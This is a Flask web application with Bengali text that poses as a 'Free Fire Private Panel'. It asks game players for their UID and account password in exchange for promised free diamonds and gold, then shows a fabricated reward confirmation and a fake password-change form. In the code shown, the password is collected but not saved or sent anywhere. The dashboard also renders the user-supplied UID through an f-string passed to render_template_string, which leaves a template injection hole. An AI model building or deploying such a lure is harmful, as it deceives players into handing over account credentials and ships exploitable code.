from flask import Flask, render_template_string, request, redirect, url_for, session
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key_random_string_here'  # সেশন সিকিউরিটির জন্য

# হোমপেজ / লগইন পেজ (যেখানে ফেসবুক বা ডিসকর্ড স্টাইলে লগইন এবং রিওয়ার্ড প্যানেল থাকবে)
@app.route('/')
def home():
    html_content = """
    <!DOCTYPE html>
    <html lang="bn">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Free Fire Private Panel</title>
        <style>
            body { background-color: #0b0f19; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .card { background-color: #121826; border: 1px solid #1f2937; padding: 30px; border-radius: 16px; width: 380px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7); text-align: center; }
            h2 { color: #ffb703; margin-bottom: 5px; }
            p { font-size: 13px; color: #9ca3af; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin: 8px 0; background: #1f2937; border: 1px solid #374151; color: white; border-radius: 8px; box-sizing: border-box; }
            .btn { width: 100%; background-color: #ffb703; color: #000; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 15px; }
            .btn:hover { background-color: #fb8500; color: white; }
            .reward-box { background: #1e293b; border-left: 4px solid #10b981; padding: 12px; margin-top: 15px; text-align: left; border-radius: 4px; font-size: 13px; }
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🔥 FF Private Panel</h2>
            <p>আপনার গেম অ্যাকাউন্ট দিয়ে লগইন করুন এবং রিওয়ার্ড क्লেইম করুন</p>
            
            <form action="/login" method="POST">
                <input type="text" name="uid" placeholder="গেম ইউআইডি (UID) দিন" required>
                <input type="password" name="password" placeholder="অ্যাকাউন্ট পাসওয়ার্ড দিন" required>
                <button type="submit" class="btn">সাইন ইন ও রিওয়ার্ড নিন</button>
            </form>

            <div class="reward-box">
                <b>🎁 স্পেশাল অফার:</b><br>
                • সফল লগইনে মেইলবক্সে যাবে: <b>৫০০ ডায়মন্ড ও ১০০ গোল্ড</b><br>
                • ডেইলি বোনাস: <b>১০০ ডায়মন্ড ও ২০০ গোল্ড</b>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_content)

# লগইন প্রসেস ও মেইলবক্সে রিওয়ার্ড সেন্ড করার লজিক
@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('uid')
    password = request.form.get('password')
    
    # সেশনে ডেটা সেভ করে ড্যাশবোর্ডে পাঠানো
    session['uid'] = uid
    return redirect(url_for('dashboard'))

# ড্যাশবোর্ড বা পাসওয়ার্ড কাস্টমাইজেশন ও মেইলবক্স রিওয়ার্ড স্ট্যাটাস পেজ
@app.route('/dashboard')
def dashboard():
    uid = session.get('uid', 'Guest_197')
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="bn">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard - FF Panel</title>
        <style>
            body {{ background-color: #0b0f19; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
            .card {{ background-color: #121826; border: 1px solid #1f2937; padding: 25px; border-radius: 16px; width: 400px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7); }}
            h3 {{ color: #10b981; margin-top: 0; }}
            .info {{ background: #1f2937; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; }}
            input {{ width: 100%; padding: 10px; margin: 6px 0; background: #111827; border: 1px solid #374151; color: white; border-radius: 6px; box-sizing: border-box; }}
            .btn {{ width: 100%; background-color: #3b82f6; color: white; padding: 10px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 8px; }}
            .btn-danger {{ background-color: #ef4444; margin-top: 15px; }}
            .success-msg {{ color: #34d399; font-size: 13px; font-weight: bold; margin-top: 10px; text-align: center; }}
        </style>
    </head>
    <body>
        <div class="card">
            <h3>✅ সফলভাবে লগইন সম্পন্ন!</h3>
            <div class="info">
                <b>সংযুক্ত UID:</b> {uid}<br>
                <b>মেইলবক্স স্ট্যাটাস:</b> ৫০০ ডায়মন্ড ও ১০০ গোল্ড পাঠানো হয়েছে! 🚀
            </div>

            <hr style="border: 0; border-top: 1px solid #374151; margin: 15px 0;">

            <h4>⚙️ পাসওয়ার্ড কাস্টমাইজ করুন</h4>
            <form action="/update-password" method="POST">
                <input type="password" name="new_password" placeholder="নতুন পাসওয়ার্ড দিন" required>
                <button type="submit" class="btn">পাসওয়ার্ড আপডেট করুন</button>
            </form>

            <form action="/" method="GET">
                <button type="submit" class="btn btn-danger">লগআউট</button>
            </form>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_content)

# পাসওয়ার্ড আপডেটের রাউট
@app.route('/update-password', methods=['POST'])
def update_password():
    return """
    <script>
        alert('পাসওয়ার্ড সফলভাবে পরিবর্তন করা হয়েছে!');
        window.location.href = '/dashboard';
    </script>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
